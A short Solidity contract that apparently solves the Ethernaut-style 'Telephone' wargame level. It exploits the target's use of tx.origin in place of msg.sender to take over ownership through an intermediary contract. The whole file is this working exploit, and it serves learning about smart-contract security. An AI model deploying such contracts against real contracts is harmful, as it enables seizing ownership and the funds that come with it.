// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title Hacke contract for Telephone
    @notice since tx.origin is the caller of the function in HackTelephone and msg.sender is HackTelephone, 
            we can change ownership by passing the check 
*/

interface Telephone {
    function changeOwner(address _owner) external; 
}

contract HackTelephone {
    Telephone toHack;

    constructor(address _toHack) {
        toHack = Telephone(_toHack);
    }

    function claimOwnership() external {
        toHack.changeOwner(msg.sender);
    }
}